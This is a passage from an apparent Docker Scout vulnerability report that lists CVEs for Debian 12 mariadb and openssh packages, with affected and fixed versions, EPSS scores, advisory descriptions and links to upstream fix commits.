[bookworm] - mariadb 1:10.11.13-0+deb12u1
- mariadb-10.5 <removed>
Fixed in MariaDB: 11.4.6, 10.6.22, 10.5.29, 10.11.12
MariaDB bug: https://jira.mariadb.org/browse/MDEV-36268
MariaDB commit: https://github.com/MariaDB/server/commit/6aa860be27480db134a3c71065b9b47d15b72674 (mariadb-10.5.29)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-21490?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.11-0%2Bdeb12u1"><img alt="medium : CVE--2025--21490" src="https://img.shields.io/badge/CVE--2025--21490-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.11-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.11-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.442%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Vulnerability in the MySQL Server product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are 8.0.40 and prior, 8.4.3 and prior and  9.1.0 and prior. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

---
- mysql-8.0 8.0.41-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1093877)
- mariadb 1:11.4.5-1
[bookworm] - mariadb 1:10.11.11-0+deb12u1
- mariadb-10.5 <removed>
Fixed in MariaDB 11.7.2, 11.4.5, 10.11.11, 10.6.21, 10.5.28
MariaDB Bug: https://jira.mariadb.org/browse/MDEV-29182
MariaDB Commit: https://github.com/MariaDB/server/commit/82310f926b7c6547f25dd80e4edf3f38b22913e5 (mariadb-10.5.28)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-21096?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.11-0%2Bdeb12u1"><img alt="medium : CVE--2024--21096" src="https://img.shields.io/badge/CVE--2024--21096-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.11-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.11-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.121%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Vulnerability in the MySQL Server product of Oracle MySQL (component: Client: mysqldump).  Supported versions that are affected are 8.0.36 and prior and  8.3.0 and prior. Difficult to exploit vulnerability allows unauthenticated attacker with logon to the infrastructure where MySQL Server executes to compromise MySQL Server.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of MySQL Server accessible data as well as  unauthorized read access to a subset of MySQL Server accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of MySQL Server. CVSS 3.1 Base Score 4.9 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L).

---
- mysql-8.0 8.0.37-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1069189)
- mariadb 1:10.11.8-1
[bookworm] - mariadb 1:10.11.11-0+deb12u1
- mariadb-10.5 <removed>
[bullseye] - mariadb-10.5 <no-dsa> (Minor issue)
- mariadb-10.3 <removed>
MariaDB: Fixed in 11.2.4, 11.1.5, 11.0.6, 10.11.8, 10.6.18 and 10.5.25
MariaDB Bug: https://jira.mariadb.org/browse/MDEV-33727
Regression: https://jira.mariadb.org/browse/MDEV-34339
Regression: https://jira.mariadb.org/browse/MDEV-34183
Regression: https://jira.mariadb.org/browse/MDEV-34203
Regression: https://jira.mariadb.org/browse/MDEV-34318
https://mariadb.org/mariadb-dump-file-compatibility-change/
https://ddev.com/blog/mariadb-dump-breaking-change/
MariaDB commit [1/2]: https://github.com/MariaDB/server/commit/13663cb5c4558383e9dab96e501d72ceb7a0a158 (mariadb-10.5.25)
MariaDB commit [2/2]: https://github.com/MariaDB/server/commit/1c425a8d854061d1987ad4ea352c7270652e31c4 (mariadb-10.5.25)
MariaDB partial regression fix [1/3]: https://github.com/MariaDB/server/commit/77c4c0f256f3c268d3f72625b04240d24a70513c (mariadb-10.5.26)
MariaDB partial regression fix [2/3]: https://github.com/MariaDB/server/commit/d60f5c11ea9008fa57444327526e3d2c8633ba06 (mariadb-10.5.26)
MariaDB partial regression fix [3/3]: https://github.com/MariaDB/server/commit/d20518168aff435a4843eebb108e5b9df24c19fb (mariadb-10.5.26)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52970?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.13-0%2Bdeb12u1"><img alt="medium : CVE--2023--52970" src="https://img.shields.io/badge/CVE--2023--52970-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.209%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

MariaDB Server 10.4 through 10.5.*, 10.6 through 10.6.*, 10.7 through 10.11.*, 11.0 through 11.0.*, and 11.1 through 11.4.* crashes in Item_direct_view_ref::derived_field_transformer_for_where.

---
- mariadb 1:11.8.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1100437)
[bookworm] - mariadb 1:10.11.13-0+deb12u1
- mariadb-10.5 <removed>
https://jira.mariadb.org/browse/MDEV-32086
Fixed in MariaDB: 10.5.29, 10.6.22, 10.11.12, 11.4.6, 11.8.2
MariaDB commit [1/2]: https://github.com/MariaDB/server/commit/9b313d2de1df65626abb3b1d6c973f74addb12fb (mariadb-10.5.29)
MariaDB commit [2/2]: https://github.com/MariaDB/server/commit/4fc9dc84b017cf9f30585bcdef0663f9425fe460 (mariadb-10.5.29)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52969?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.13-0%2Bdeb12u1"><img alt="medium : CVE--2023--52969" src="https://img.shields.io/badge/CVE--2023--52969-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.209%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

MariaDB Server 10.4 through 10.5.*, 10.6 through 10.6.*, 10.7 through 10.11.*, and 11.0 through 11.0.* can sometimes crash with an empty backtrace log. This may be related to make_aggr_tables_info and optimize_stage2.

---
- mariadb 1:11.8.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1100437)
[bookworm] - mariadb 1:10.11.13-0+deb12u1
- mariadb-10.5 <removed>
https://jira.mariadb.org/browse/MDEV-32083
Fixed in MariaDB: 10.5.29, 10.6.22, 10.11.12, 11.4.6, 11.8.2
Fixed by fix of MDEV-32086/CVE-2023-52970

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-22084?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.6-0%2Bdeb12u1"><img alt="medium : CVE--2023--22084" src="https://img.shields.io/badge/CVE--2023--22084-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.6-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.6-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.368%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Vulnerability in the MySQL Server product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are 5.7.43 and prior, 8.0.34 and prior and  8.1.0. Easily exploitable vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.1 Base Score 4.9 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

---
- mariadb 1:10.11.6-1
[bookworm] - mariadb 1:10.11.6-0+deb12u1
- mariadb-10.5 <removed>
[bullseye] - mariadb-10.5 1:10.5.23-0+deb11u1
- mariadb-10.3 <removed>
- mysql-8.0 8.0.35-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1055034)
Fixed in MariaDB: 11.2.2, 11.1.3, 11.0.4, 10.11.6, 10.10.7, 10.6.16, 10.5.23, 10.4.32
https://github.com/MariaDB/server/commit/15ae97b1c2c14f1263cdc853673c4129625323de (mariadb-10.4.32)
MariaDB bug: https://jira.mariadb.org/browse/MDEV-32578
MySQL commit: https://github.com/mysql/mysql-server/commit/38e9a0779aeea2d197c727e306a910c56b26a47c (mysql-5.7.44)
Introduced by MySQL commit: https://github.com/mysql/mysql-server/commit/0c954c2289a75d90d1088356b1092437ebf45a1d (mysql-5.7.2-12)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-52971?s=debian&n=mariadb&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A10.11.13-0%2Bdeb12u1"><img alt="low : CVE--2023--52971" src="https://img.shields.io/badge/CVE--2023--52971-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:10.11.13-0+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.062%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

MariaDB Server 10.10 through 10.11.* and 11.0 through 11.4.* crashes in JOIN::fix_all_splittings_in_plan.

---
- mariadb 1:11.8.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1100437)
[bookworm] - mariadb 1:10.11.13-0+deb12u1
- mariadb-10.5 <not-affected> (Vulnerable code introduced later)
https://jira.mariadb.org/browse/MDEV-32084
Fixed in MariaDB: 10.11.12, 11.4.6, 11.8.2
MariaDB commit: https://github.com/MariaDB/server/commit/3b4de4c281cb3e33e6d3ee9537e542bf0a84b83e (mariadb-10.11.12)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 12" src="https://img.shields.io/badge/L-12-fce1a9"/> <!-- unspecified: 0 --><strong>openssh</strong> <code>1:9.2p1-2+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/openssh@1%3A9.2p1-2%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-26465?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u5"><img alt="medium : CVE--2025--26465" src="https://img.shields.io/badge/CVE--2025--26465-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>64.393%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in OpenSSH when the VerifyHostKeyDNS option is enabled. A machine-in-the-middle attack can be performed by a malicious machine impersonating a legit server. This issue occurs due to how OpenSSH mishandles error codes in specific conditions when verifying the host key. For an attack to be considered successful, the attacker needs to manage to exhaust the client's memory resource first, turning the attack complexity high.

---
- openssh 1:9.9p2-1
https://www.openssh.com/releasenotes.html#9.9p2
https://www.qualys.com/2025/02/18/openssh-mitm-dos.txt
Introduced with: https://github.com/openssh/openssh-portable/commit/5e39a49930d885aac9c76af3129332b6e772cd75 (V_6_8_P1)
Fixed by: https://github.com/openssh/openssh-portable/commit/0832aac79517611dd4de93ad0a83577994d9c907 (V_9_9_P1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-51385?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u2"><img alt="medium : CVE--2023--51385" src="https://img.shields.io/badge/CVE--2023--51385-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>16.522%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>95th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In ssh in OpenSSH before 9.6, OS command injection might occur if a user name or host name has shell metacharacters, and this name is referenced by an expansion token in certain situations. For example, an untrusted Git repository can have a submodule with shell metacharacters in a user name or host name.

---
- openssh 1:9.6p1-1
https://www.openwall.com/lists/oss-security/2023/12/18/2
https://github.com/openssh/openssh-portable/commit/7ef3787c84b6b524501211b11a26c742f829af1a (V_9_6_P1)
https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32728?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u6"><img alt="medium : CVE--2025--32728" src="https://img.shields.io/badge/CVE--2025--32728-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.124%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In sshd in OpenSSH before 10.0, the DisableForwarding directive does not adhere to the documentation stating that it disables X11 and agent forwarding.

---
- openssh 1:10.0p1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1102603)
[bookworm] - openssh 1:9.2p1-2+deb12u6
https://lists.mindrot.org/pipermail/openssh-unix-dev/2025-April/041879.html
Fixed by: https://github.com/openssh/openssh-portable/commit/fc86875e6acb36401dfc1dfb6b628a9d1460f367 (V_10_0_P1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-6387?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u3"><img alt="low : CVE--2024--6387" src="https://img.shields.io/badge/CVE--2024--6387-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>50.789%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A security regression (CVE-2006-5051) was discovered in OpenSSH's server (sshd). There is a race condition which can lead sshd to handle some signals in an unsafe manner. An unauthenticated, remote attacker may be able to trigger it by failing to authenticate within a set time period.

---
- openssh 1:9.7p1-7
[bullseye] - openssh <not-affected> (Vulnerable code introduced later)
Introduced with: https://github.com/openssh/openssh-portable/commit/752250caabda3dd24635503c4cd689b32a650794 (V_8_5_P1)
Fixed by: https://github.com/openssh/openssh-portable/commit/81c1099d22b81ebfd20a334ce986c4f753b0db29 (V_9_8_P1)
https://lists.mindrot.org/pipermail/openssh-unix-announce/2024-July/000158.html
https://www.openwall.com/lists/oss-security/2024/07/01/1
https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-51384?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u2"><img alt="low : CVE--2023--51384" src="https://img.shields.io/badge/CVE--2023--51384-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.044%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In ssh-agent in OpenSSH before 9.6, certain destination constraints can be incompletely applied. When destination constraints are specified during addition of PKCS#11-hosted private keys, these constraints are only applied to the first key, even if a PKCS#11 token returns multiple keys.

---
- openssh 1:9.6p1-1
[bookworm] - openssh 1:9.2p1-2+deb12u2
[bullseye] - openssh <not-affected> (Vulnerable code introduced later; per-hop destination constraints support added in OpenSSH 8.9)
[buster] - openssh <not-affected> (Vulnerable code introduced later; per-hop destination constraints support added in OpenSSH 8.9)
https://www.openwall.com/lists/oss-security/2023/12/18/2
https://github.com/openssh/openssh-portable/commit/881d9c6af9da4257c69c327c4e2f1508b2fa754b (V_9_6_P1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-48795?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u2"><img alt="low : CVE--2023--48795" src="https://img.shields.io/badge/CVE--2023--48795-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>59.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>98th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The SSH transport protocol with certain OpenSSH extensions, found in OpenSSH before 9.6 and other products, allows remote attackers to bypass integrity checks such that some packets are omitted (from the extension negotiation message), and a client and server may consequently end up with a connection for which some security features have been downgraded or disabled, aka a Terrapin attack. This occurs because the SSH Binary Packet Protocol (BPP), implemented by these extensions, mishandles the handshake phase and mishandles use of sequence numbers. For example, there is an effective attack against SSH's use of ChaCha20-Poly1305 (and CBC with Encrypt-then-MAC). The bypass occurs in chacha20-poly1305@openssh.com and (if CBC is used) the -etm@openssh.com MAC algorithms. This also affects Maverick Synergy Java SSH API before 3.1.0-SNAPSHOT, Dropbear through 2022.83, Ssh before 5.1.1 in Erlang/OTP, PuTTY before 0.80, AsyncSSH before 2.14.2, golang.org/x/crypto before 0.17.0, libssh before 0.10.6, libssh2 through 1.11.0, Thorn Tech SFTP Gateway before 3.4.6, Tera Term before 5.1, Paramiko before 3.4.0, jsch before 0.2.15, SFTPGo before 2.5.6, Netgate pfSense Plus through 23.09.1, Netgate pfSense CE through 2.7.2, HPN-SSH through 18.2.0, ProFTPD before 1.3.8b (and before 1.3.9rc2), ORYX CycloneSSH before 2.3.4, NetSarang XShell 7 before Build 0144, CrushFTP before 10.6.0, ConnectBot SSH library before 2.2.22, Apache MINA sshd through 2.11.0, sshj through 0.37.0, TinySSH through 20230101, trilead-ssh2 6401, LANCOM LCOS and LANconfig, FileZilla before 3.66.4, Nova before 11.8, PKIX-SSH before 14.4, SecureCRT before 9.4.3, Transmit5 before 5.10.4, Win32-OpenSSH before 9.5.0.0p1-Beta, WinSCP before 6.2.2, Bitvise SSH Server before 9.32, Bitvise SSH Client before 9.33, KiTTY through 0.76.1.13, the net-ssh gem 7.2.0 for Ruby, the mscdex ssh2 module before 1.15.0 for Node.js, the thrussh library before 0.35.1 for Rust, and the Russh crate before 0.40.2 for Rust.

---
- dropbear 2022.83-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059001)
[bookworm] - dropbear 2022.83-1+deb12u1
[bullseye] - dropbear 2020.81-3+deb11u1
[buster] - dropbear <not-affected> (ChaCha20-Poly1305 support introduced in 2020.79; *-EtM not supported as of 2022.83)
- erlang 1:25.3.2.8+dfsg-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059002)
[buster] - erlang <no-dsa> (Minor issue)
- filezilla 3.66.4-1
[bookworm] - filezilla 3.63.0-1+deb12u3
[bullseye] - filezilla 3.52.2-3+deb11u1
[buster] - filezilla <not-affected> (OpenSSH extension in question not implemented)
- golang-go.crypto 1:0.17.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059003)
[bookworm] - golang-go.crypto <no-dsa> (Minor issue)
[bullseye] - golang-go.crypto <no-dsa> (Minor issue)
[buster] - golang-go.crypto <postponed> (Limited support, minor issue, follow bullseye DSAs/point-releases)
- jsch <not-affected> (ChaCha20-Poly1305 support introduced in 0.1.61; *-EtM support introduced in 0.1.58)
- libssh 0.10.6-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059004)
- libssh2 1.11.0-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059005)
[bookworm] - libssh2 <not-affected> (ChaCha20-Poly1305 and CBC-EtM support not present)
[bullseye] - libssh2 <not-affected> (ChaCha20-Poly1305 and CBC-EtM support not present)
[buster] - libssh2 <not-affected> (ChaCha20-Poly1305 and CBC-EtM support not present)
- openssh 1:9.6p1-1
- paramiko 3.4.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059006)
[bookworm] - paramiko <ignored> (Minor issue)
[bullseye] - paramiko <no-dsa> (Minor issue)
[buster] - paramiko <not-affected> (ChaCha20-Poly1305 and CBC-EtM support not present)
- phpseclib 1.0.22-1
- php-phpseclib 2.0.46-1
- php-phpseclib3 3.0.35-1
- proftpd-dfsg 1.3.8.b+dfsg-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059144)
[bookworm] - proftpd-dfsg 1.3.8+dfsg-4+deb12u3
[buster] - proftpd-dfsg <no-dsa> (Minor issue)
- proftpd-mod-proxy 0.9.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059290)
[bookworm] - proftpd-mod-proxy 0.9.2-1+deb12u1
[bullseye] - proftpd-mod-proxy <ignored> (Minor issue)
- putty 0.80-1
- python-asyncssh 2.15.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059007)
- tinyssh 20230101-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059058; unimportant)
- trilead-ssh2 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059294)
[trixie] - trilead-ssh2 <ignored> (Minor issue, only reverse dep uses client-side only)
[bookworm] - trilead-ssh2 <ignored> (Minor issue, only reverse dep uses client-side only)
[bullseye] - trilead-ssh2 <no-dsa> (Minor issue)
[buster] - trilead-ssh2 <no-dsa> (Minor issue)
https://terrapin-attack.com/
https://www.openwall.com/lists/oss-security/2023/12/18/3
dropbear: https://github.com/mkj/dropbear/commit/6e43be5c7b99dbee49dc72b6f989f29fdd7e9356
Erlang/OTP: https://github.com/erlang/otp/commit/ee67d46285394db95133709cef74b0c462d665aa (OTP-24.3.4.15, OTP-25.3.2.8, OTP-26.2.1)
filezilla: https://svn.filezilla-project.org/filezilla?view=revision&revision=11047
filezilla: https://svn.filezilla-project.org/filezilla?view=revision&revision=11048
filezilla: https://svn.filezilla-project.org/filezilla?view=revision&revision=11049
golang.org/x/crypto/ssh: https://groups.google.com/g/golang-announce/c/qA3XtxvMUyg
golang.org/x/crypto/ssh: https://github.com/golang/go/issues/64784
golang.org/x/crypto/ssh: https://github.com/golang/crypto/commit/9d2ee975ef9fe627bf0a6f01c1f69e8ef1d4f05d (v0.17.0)
jsch: https://github.com/mwiede/jsch/issues/457
jsch: https://github.com/norrisjeremy/jsch/commit/6214da974286a8b94a95f4cf6cec96e972ffd370 (jsch-0.2.15)
libssh: https://www.libssh.org/security/advisories/CVE-2023-48795.txt
libssh: https://gitlab.com/libssh/libssh-mirror/-/commit/4cef5e965a46e9271aed62631b152e4bd23c1e3c (libssh-0.10.6)
libssh: https://gitlab.com/libssh/libssh-mirror/-/commit/0870c8db28be9eb457ee3d4f9a168959d9507efd (libssh-0.10.6)
libssh: https://gitlab.com/libssh/libssh-mirror/-/commit/5846e57538c750c5ce67df887d09fa99861c79c6 (libssh-0.10.6)
libssh: https://gitlab.com/libssh/libssh-mirror/-/commit/89df759200d31fc79fbbe213d8eda0d329eebf6d (libssh-0.10.6)
libssh2: https://github.com/libssh2/libssh2/issues/1290
libssh2: https://github.com/libssh2/libssh2/pull/1291
libssh2: https://github.com/libssh2/libssh2/commit/d34d9258b8420b19ec3f97b4cc5bf7aa7d98e35a
OpenSSH: https://www.openwall.com/lists/oss-security/2023/12/18/2
OpenSSH (strict key exchange): https://github.com/openssh/openssh-portable/commit/1edb00c58f8a6875fad6a497aa2bacf37f9e6cd5 (V_9_6_P1)
paramiko: https://github.com/paramiko/paramiko/issues/2337
phpseclib: https://github.com/phpseclib/phpseclib/issues/1972
phpseclib: https://github.com/phpseclib/phpseclib/commit/c8e3ab9317abae80d7f58fd9acd9214b57572b32 (1.0.22, 2.0.46, 3.0.35)
proftpd: https://github.com/proftpd/proftpd/issues/1760
proftpd: https://github.com/proftpd/proftpd/commit/7fba68ebb3ded3047a35aa639e115eba7d585682 (v1.3.9rc2)
proftpd: https://github.com/proftpd/proftpd/commit/bcec15efe6c53dac40420731013f1cd2fd54123b (v1.3.8b)
proftpd-mod-proxy: https://github.com/Castaglia/proftpd-mod_proxy/issues/257
proftpd-mod-proxy: https://github.com/Castaglia/proftpd-mod_proxy/commit/54612735629231de2242d6395d334539604872fb (v0.9.3)
PuTTY: https://www.chiark.greenend.org.uk/~sgtatham/putty/wishlist/vuln-terrapin.html
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=9e099151574885f3c717ac10a633a9218db8e7bb (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=f2e7086902b3605c96e54ef9c956ca7ab000010e (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=9fcbb86f715bc03e58921482efe663aa0c662d62 (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=244be5412728a7334a2d457fbac4e0a2597165e5 (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=58fc33a155ad496bdcf380fa6193302240a15ae9 (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=0b00e4ce26d89cd010e31e66fd02ac77cb982367 (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=fdc891d17063ab26cf68c74245ab1fd9771556cb (0.80)
PuTTY: https://git.tartarus.org/?p=simon/putty.git;a=commit;h=b80a41d386dbfa1b095c17bd2ed001477f302d46 (0.80)
asyncssh: https://github.com/ronf/asyncssh/security/advisories/GHSA-hfmc-7525-mj55
asyncssh: https://github.com/ronf/asyncssh/commit/0bc73254f41acb140187e0c89606311f88de5b7b (v2.14.2)
tinyssh: https://github.com/janmojzis/tinyssh/issues/81
tinyssh: https://github.com/janmojzis/tinyssh/commit/ebaa1bd23c2c548af70cc8151e85c74f4c8594bb
tinyssh: 20230101-4 implements kex-strict-s-v00@openssh.com for the strict kex support. But
tinyssh: since there is no support for EXT_INFO in tinyssh, even with the present
tinyssh: chacha20-poly1305@openssh.com encryption algorith, there is no downgrade of the
tinyssh: connection security.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-28531?s=debian&n=openssh&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A9.2p1-2%2Bdeb12u2"><img alt="low : CVE--2023--28531" src="https://img.shields.io/badge/CVE--2023--28531-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1:9.2p1-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.328%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ssh-add in OpenSSH before 9.3 adds smartcard keys to ssh-agent without the intended per-hop destination constraints. The earliest affected version is 8.9.

---
- openssh 1:9.3p1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1033166)
[bookworm] - openssh 1:9.2p1-2+deb12u2
[bullseye] - openssh <not-affected> (Vulnerable code introduced later; per-hop destination constraints support added in OpenSSH 8.9)
[buster] - openssh <not-affected> (Vulnerable code introduced later; per-hop destination constraints support added in OpenSSH 8.9)
https://github.com/openssh/openssh-portable/commit/54ac4ab2b53ce9fcb66b8250dee91c070e4167ed (V_9_3_P1)

</blockquote>
</details>

